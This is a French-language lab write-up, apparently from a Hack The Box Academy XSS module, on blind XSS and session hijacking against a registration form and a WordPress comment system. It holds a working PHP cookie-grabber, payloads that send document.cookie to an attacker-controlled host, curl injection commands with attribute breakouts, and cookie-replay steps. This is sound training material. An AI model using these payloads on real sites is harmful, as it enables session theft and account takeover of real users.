---

titre: "Cross-Site Scripting (XSS) — Exfiltration de cookies (Session Hijacking) & Blind XSS"

plateforme: "Hack The Box Academy"

module: "Cross-Site Scripting (XSS)"

date: 2026-06-30

tags: [HTB, XSS, WebSec, BlindXSS, SessionHijacking, CookieStealing, WordPress, Notes]

flag: "HTB{cr055_5173_5cr1p71n6_n1nj4}"

---

  

# XSS — Exfiltration de cookies (Session Hijacking) & Blind XSS

  

> Suite de [[Cross-Site Scripting (XSS) — Fondamentaux, Stored & Reflected]].

> Couvre les sections « Session Hijacking » et le « Skills Assessment » du module.

> Outillage détaillé dans [[Outillage — WSL2, Exegol, VPN HTB & serveur d'exfiltration]].

> Contournements de filtres dans [[XSS — Bypass & Filter Evasion (WAF, Sanitizers)]].

  

---

  

## 1. Le principe : voler une session sans mot de passe

  

Les applications web maintiennent l'état « connecté » d'un utilisateur via un **cookie de session**. Ce cookie est en pratique un *ticket d'entrée* : tant qu'il est valide, le serveur considère le porteur comme authentifié, **sans redemander d'identifiants**.

  

Conséquence offensive : si on parvient à lire le `document.cookie` de la victime (via XSS) et à l'exfiltrer vers un serveur qu'on contrôle, on peut **rejouer ce cookie dans notre propre navigateur** et usurper la session — c'est le **Session Hijacking** (aka *Cookie Stealing*). On contourne entièrement l'authentification.

  

> ⚠️ **Limite majeure** : si le cookie porte le flag `HttpOnly`, il est **invisible** depuis JavaScript (`document.cookie` ne le renvoie pas). Le session hijacking par XSS ne fonctionne donc **que** sur des cookies sans `HttpOnly`. C'est la contre-mesure n°1 côté défense.

  

---

  

## 2. Blind XSS — quand on ne voit pas le rendu

  

### Définition

  

Une **Blind XSS** est une XSS stockée (*Stored*) dont la charge **se déclenche sur une page à laquelle l'attaquant n'a pas accès**. On injecte « à l'aveugle » : on ne voit jamais le résultat, c'est un **tiers privilégié** (souvent un admin) qui exécute le payload en consultant un back-office.

  

### Vecteurs typiques

  

| Vecteur | Où le payload se déclenche |

|---|---|

| Formulaire de contact | Boîte de réception / ticketing admin |

| Avis / commentaires | Panneau de modération |

| Détails de profil utilisateur | Vue admin « gestion des utilisateurs » |

| Tickets de support | Interface support |

| En-tête HTTP `User-Agent` | Logs / dashboard analytics consultés par un admin |

  

### Le double problème de la détection aveugle

  

1. **Quel champ est vulnérable ?** N'importe lequel peut l'être, et on ne voit aucun retour.

2. **Quel payload fonctionne ?** Le filtrage backend est inconnu — la page peut être vulnérable mais notre injection échouer selon le contexte HTML.

  

> Note : la Blind XSS a un **meilleur taux de succès sur les cas DOM-based** car, quand on a accès au code côté client, on peut écrire le payload exact pour le contexte. En Blind « pur » (stocké côté serveur), on procède par essais.

  

---

  

## 3. Technique de détection : le script distant **nommé**

  

L'astuce centrale. En HTML, on peut charger un script **distant** au lieu d'écrire le JS inline :

  

```html

<script src="http://OUR_IP/script.js"></script>

```

  

Quand ce code s'exécute chez la victime, **son navigateur émet une requête HTTP vers notre serveur** pour récupérer le fichier. Cette requête, visible dans nos logs, **prouve l'exécution** du payload.

  

Pour résoudre le problème « quel champ ? », on **nomme le script d'après le champ injecté** :

  

```html

<script src="http://OUR_IP/fullname"></script>   <!-- dans le champ fullname -->

<script src="http://OUR_IP/username"></script>   <!-- dans le champ username -->

<script src="http://OUR_IP/imgurl"></script>     <!-- dans le champ imgurl -->

```

  

Le chemin après le `/` n'est qu'une **étiquette de débogage** : peu importe que le fichier existe (un `404` dans nos logs suffit, on a juste besoin de *voir la requête arriver*). Si on reçoit un appel sur `/imgurl`, alors **le champ `imgurl` est vulnérable**.

  

### Réduire la surface de test

  

- **email** : souvent validé front + back → on met une valeur valide, on ne le teste pas (sauf si `type=text` sans validation, cf. §6).

- **password** : généralement hashé, jamais réaffiché en clair → on l'ignore.

  

On concentre l'effort sur les champs texte réellement réaffichés (nom, username, website/url, commentaire…).

  

---

  

## 4. Le serveur d'exfiltration (listener)

  

On héberge un serveur qui jouera **deux rôles** : servir `script.js` **et** recevoir les cookies. Détails d'installation et de mise en réseau (WSL2/Exegol/VPN) dans [[Outillage — WSL2, Exegol, VPN HTB & serveur d'exfiltration]].

  

```bash

mkdir -p /workspace/xss && cd /workspace/xss

php -S 0.0.0.0:8080      # serveur web servant le dossier courant

```

  

Le serveur PHP en mode `-S` **journalise en direct** chaque requête reçue (une ligne par requête) — c'est notre fenêtre d'observation.

  

---

  

## 5. Le cookie grabber `index.php`

  

Le récepteur côté serveur : il reçoit le cookie, le parse proprement et l'écrit dans un fichier.

  

```php

<?php

if (isset($_GET['c'])) {

    $list = explode(";", $_GET['c']);

    foreach ($list as $key => $value) {

        $cookie = urldecode($value);

        $file = fopen("cookies.txt", "a+");

        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");

        fclose($file);

    }

}

?>

```

  

Décortiqué :

  

| Élément | Rôle |

|---|---|

| `isset($_GET['c'])` | Ne fait quelque chose **que si** le paramètre `c` (le cookie) est présent dans l'URL. |

| `explode(";", ...)` | `document.cookie` renvoie `a=1; b=2; c=3` → on sépare chaque cookie sur une ligne distincte. |

| `urldecode()` | Le navigateur encode les caractères spéciaux dans l'URL → on décode pour relire la vraie valeur. |

| `fopen(..., "a+")` | Mode **append** : plusieurs victimes s'ajoutent à la suite sans s'écraser. |

  

> 💡 **Pourquoi `index.php` n'affiche rien quand on le `curl` sans `?c=`** : la condition `isset` est fausse, le bloc est sauté, et le script n'`echo` jamais rien — il écrit *silencieusement* dans `cookies.txt`. C'est **voulu** : une page d'exfiltration discrète ne doit rien afficher. À l'inverse, un `curl` sur `script.js` renvoie son contenu car c'est un **fichier statique** (le serveur le sert tel quel, sans l'exécuter).

  

---

  

## 6. Le payload d'exfiltration `script.js`

  

Deux variantes classiques (PayloadsAllTheThings) :

  

```javascript

document.location='http://OUR_IP/index.php?c='+document.cookie;   // redirige la victime → VISIBLE, suspect

new Image().src='http://OUR_IP/index.php?c='+document.cookie;     // ajoute une image invisible → DISCRET

```

  

On retient **`new Image()`** : il déclenche une requête réseau en arrière-plan sans modifier l'affichage de la victime. La version `document.location` *redirige* le navigateur, ce qui est voyant.

  

Contenu final de `script.js` (port à reporter partout !) :

  

```javascript

new Image().src='http://10.10.17.155:8080/index.php?c='+document.cookie;

```

  

Le payload injecté dans le champ vulnérable charge alors ce fichier :

  

```html

<script src=http://10.10.17.155:8080/script.js></script>

```

  

À l'exécution, on reçoit **deux requêtes** :

  

```

10.129.42.117:xxxxx [200]: GET /script.js                 ← chargement du JS

10.129.42.117:xxxxx [200]: GET /index.php?c=...cookie...   ← le JS renvoie le cookie

```

  

---

  

## 7. Workflow complet de l'attaque

  

```

[Détection blind]

   payload <script src=OUR_IP/NOM_CHAMP> dans chaque champ

        │

        ▼

   requête /NOM_CHAMP dans les logs  →  champ + payload identifiés

        │

        ▼

[Exploitation]

   remplacer la sonde par <script src=OUR_IP/script.js>

        │

        ▼

   réception de /script.js puis /index.php?c=<cookie>

        │

        ▼

[Hijacking]

   injecter le cookie volé dans le navigateur (ou curl -b)  →  session admin

```

  

---

  

## 8. Rejouer le cookie volé

  

### Via navigateur (Firefox)

  

1. Aller sur la page de login cible (ex. `/hijacking/login.php`).

2. **Shift+F9** ouvre directement l'onglet **Stockage / Storage** des DevTools (ou `F12` → Storage).

3. Déplier **Cookies**, sélectionner l'origine, cliquer **+**.

4. `Name` = partie avant le `=`, `Value` = partie après.

5. **Rafraîchir** → session usurpée (« Welcome Back Admin »).

  

### Via curl (plus rapide, sans GUI)

  

```bash

curl -s "http://TARGET/hijacking/login.php" -b "cookie=VALEUR_VOLEE"

# filtrer le flag éventuel :

curl -s "http://TARGET/hijacking/login.php" -b "cookie=VALEUR_VOLEE" | grep -iE 'flag|HTB|welcome'

```

  

Le flag `-b` envoie le cookie. Pratique quand le navigateur GUI du conteneur n'est pas commode à lancer.

  

---

  

## 9. Cas pratique #1 — Formulaire d'inscription (`/hijacking`)

  

### Reconnaissance d'abord (réflexe à ancrer)

  

Avant toute injection, **cartographier le formulaire** au lieu d'injecter à l'aveugle :

  

```bash

curl -s http://TARGET/hijacking/index.php | grep -iE 'input|name=|form|action'

```

  

Sortie révélatrice :

```html

<form name='login' ... method='get'>

  <input name='fullname' type='text'>

  <input name='username' type='text'>

  <input name='password' type='password'>

  <input name='email'    type='text'>

  <input name='imgurl'   placeholder='Profile Picture URL' type='text'>

```

  

Enseignements immédiats :

- Le champ « photo » est en réalité **`imgurl`** (Profile Picture URL), un champ **texte** donc injectable.

- `method='get'` → on peut soumettre **directement via l'URL** en `curl -G`, sans navigateur.

- Ici `email` est `type=text` → testable aussi, mais une **validation backend** subsiste (cf. piège ci-dessous).

  

### Soumission en GET via curl

  

```bash

curl -s "http://TARGET/hijacking/index.php" \

  --data-urlencode 'fullname="><script src=http://OUR_IP:8080/fullname></script>' \

  --data-urlencode 'username="><script src=http://OUR_IP:8080/username></script>' \

  --data-urlencode "password=test123" \

  --data-urlencode "email=test@test.com" \

  --data-urlencode 'imgurl="><script src=http://OUR_IP:8080/imgurl></script>' \

  -G

```

  

- `-G` force l'envoi des paramètres en **GET** dans l'URL (cohérent avec `method='get'`).

- `--data-urlencode` **encode** proprement `<`, `>`, `/`, `"`…

  

### Résultat

  

Le payload **nu** `<script src=...>` n'a rien déclenché : l'input `imgurl` est réaffiché **dans un attribut** côté admin (probable `<img src="...">`). Il a fallu un **breakout `">`** pour sortir de l'attribut avant d'injecter. La sonde gagnante :

  

```

10.129.42.117:xxxxx [200]: GET /imgurl

```

  

→ **champ `imgurl` vulnérable, payload `"><script ...>`**.

  

### Exfiltration

  

On remplace la sonde par `script.js`, même breakout :

  

```bash

curl -s "http://TARGET/hijacking/index.php" \

  --data-urlencode "fullname=test" --data-urlencode "username=test" \

  --data-urlencode "password=test123" --data-urlencode "email=test@test.com" \

  --data-urlencode 'imgurl="><script src=http://OUR_IP:8080/script.js></script>' -G

```

  

Butin :

```

Victim IP: 10.129.42.117 | Cookie: cookie=c00k1355h0u1d8353cu23d

```

(*leet speak* : « cookie should be secured » 😏)

  

---

  

## 10. Cas pratique #2 — Skills Assessment (Blog WordPress)

  

Contexte différent : **WordPress 5.7.2**, un article de blog avec **système de commentaires** modéré par un admin. Même logique Blind XSS, mais via le pipeline de commentaires WP.

  

### La 404 trompeuse

  

Soumettre le commentaire sur l'**URL de l'article** renvoie une `404 Page not found`. Sur WordPress, les commentaires **ne se postent pas** sur l'article : ils transitent par un script dédié **`/wp-comments-post.php`** en **POST**, avec des noms de champs WP normalisés.

  

### Reconnaissance du vrai formulaire

  

```bash

curl -s "http://TARGET/assessment/index.php/2021/06/11/welcome-to-security-blog/" \

  | grep -iE 'comment_post_ID|wp-comments-post|name="(author|email|url|comment)"|comment_parent'

```

  

Champs WordPress standard :

  

| Champ visible | `name=` réel | Type / contexte de rendu |

|---|---|---|

| Comment | `comment` | corps HTML (`<p>…</p>`) — souvent **sanitizé** par WP |

| Name | `author` | attribut / texte |

| Email | `email` | `type=email`, **requis** → valeur valide obligatoire |

| Website | `url` | rendu dans un **`href="..."`** → breakout `">` |

| (caché) | `comment_post_ID` | **ID de l'article ciblé** |

| (caché) | `comment_parent` | `0` (commentaire racine) |

| (bouton) | `submit` | `Post Comment` |

  

### ⭐ Le piège `comment_post_ID` (le point « mis à 8 »)

  

C'est **l'erreur clé** du challenge. Le `comment_post_ID` est un **champ caché** qui dit à WordPress **à quel article rattacher le commentaire**. Chaque post WP a un identifiant numérique interne (`ID` dans la table `wp_posts`).

  

- On avait posté avec `comment_post_ID=1` (valeur devinée) → WordPress **rejetait silencieusement** : réponse `HTTP/1.1 200 OK` avec `Content-Length: 0` (aucune redirection, aucun enregistrement).

- La reconnaissance a révélé la **vraie** valeur dans le HTML : `value='8'`. Donc ici l'article « Welcome to Security Blog » a l'**ID interne 8** (et non 1, car d'autres posts/révisions/pages ont consommé les ID 1→7).

  

> **À retenir** : sur WordPress, **toujours extraire `comment_post_ID` du formulaire réel** plutôt que de le supposer. Un mauvais ID = commentaire rejeté en silence (`200` vide au lieu du `302`).

  

### Distinguer succès et rejet

  

| Réponse | Signification |

|---|---|

| `HTTP/1.1 302 Found` + `Location: ...?unapproved=N#comment-N` + `X-Redirect-By: WordPress` | ✅ Commentaire **accepté**, en attente de modération |

| `HTTP/1.1 200 OK` + `Content-Length: 0` | ❌ Rejet silencieux (mauvais `comment_post_ID`, champ manquant…) |

| Page contenant `Duplicate comment detected` | ❌ WP bloque les **doublons** → varier le texte du `comment` |

  

### Soumission correcte (POST, ID = 8)

  

```bash

curl -s -i "http://TARGET/assessment/wp-comments-post.php" \

  --data-urlencode 'comment=Great article, thanks for sharing' \

  --data-urlencode 'author=Sarah' \

  --data-urlencode 'email=sarah@test.com' \

  --data-urlencode 'url="><script src=http://OUR_IP:8080/url></script>' \

  --data-urlencode 'submit=Post Comment' \

  --data-urlencode 'comment_post_ID=8' \

  --data-urlencode 'comment_parent=0'

```

  

- Pas de `-G` ici : WordPress attend les commentaires en **POST**.

- `-i` affiche les **headers** → on vérifie le `302` (accepté).

  

### Champ vulnérable

  

- **`comment`** (corps) : **sanitizé** par WP → le `<script>` nu n'a rien donné.

- **`url`** (Website) : réinjecté dans un **`<a href="...">`** côté modération → breakout **`">`** efficace.

  

Sonde gagnante :

```

10.129.42.117:xxxxx [200]: GET /url

```

  

### Exfiltration → flag

  

On remplace la sonde `/url` par `script.js` (même breakout `">`), on attend la modération de l'admin, et le `document.cookie` exfiltré contient le **flag** (l'énoncé demandait « *What is the value of the 'flag' cookie?* ») :

  

```

HTB{cr055_5173_5cr1p71n6_n1nj4}

```

  

---

  

## 11. Pièges rencontrés & diagnostics

  

| Symptôme | Cause | Résolution |

|---|---|---|

| `Invalid email!` dans la réponse | Email au mauvais format → **toute** la soumission rejetée | Mettre un email valide ; ne pas injecter dans `email` si validé |

| Aucune requête sur le listener | Payload **nu** alors que l'input est dans un **attribut** | Ajouter un breakout `">` ou `'>` |

| `200 OK / Content-Length: 0` (WP) | Mauvais `comment_post_ID` | Extraire la vraie valeur du HTML (`=8`) |

| `Duplicate comment detected` | WP bloque les doublons | Varier le texte du `comment` |

| Logs montrent **mon** IP (`10.10.x.x`) | Je tape sur mon propre serveur (test), pas la victime | La requête utile vient de l'**IP target** (`10.129.x.x`) |

| `404` sur l'URL d'injection | Mauvais chemin / appli pas à la racine | Énumérer (`/hijacking/`, `/assessment/`…) avant d'injecter |

| `cookies.txt` contient `session=test123` | C'est **mon** test manuel précédent | `rm cookies.txt` avant l'attaque réelle pour ne pas confondre |

  

---

  

## 12. À retenir

  

- **Blind XSS** = stored qui se déclenche dans un back-office admin inaccessible → on détecte via **script distant nommé par champ**.

- **Le contexte d'injection dicte le payload** : corps HTML → `<script>` nu ; attribut → breakout `">` (ou `'>`). C'est l'analyse manuelle qui tranche, pas un scanner.

- **`new Image().src`** pour exfiltrer discrètement ; **`HttpOnly`** est la parade défensive.

- **Reconnaissance avant injection** : `curl | grep` sur le formulaire révèle noms de champs, méthode (GET/POST), et champs cachés (`comment_post_ID`).

- **WordPress** : commentaires via `wp-comments-post.php` en POST ; `comment_post_ID` doit être l'ID réel du post ; `302` = accepté, `200` vide = rejeté.

- **Distinguer sa propre IP de celle de la victime** dans les logs pour ne pas se mentir sur le succès.

  

---

  

## Liens

  

- [[Cross-Site Scripting (XSS) — Fondamentaux, Stored & Reflected]]

- [[XSS — Bypass & Filter Evasion (WAF, Sanitizers)]]

- [[Outillage — WSL2, Exegol, VPN HTB & serveur d'exfiltration]]

- [[XSS — Phishing & faux formulaires]]

- [[XSS — Defacement & prévention]]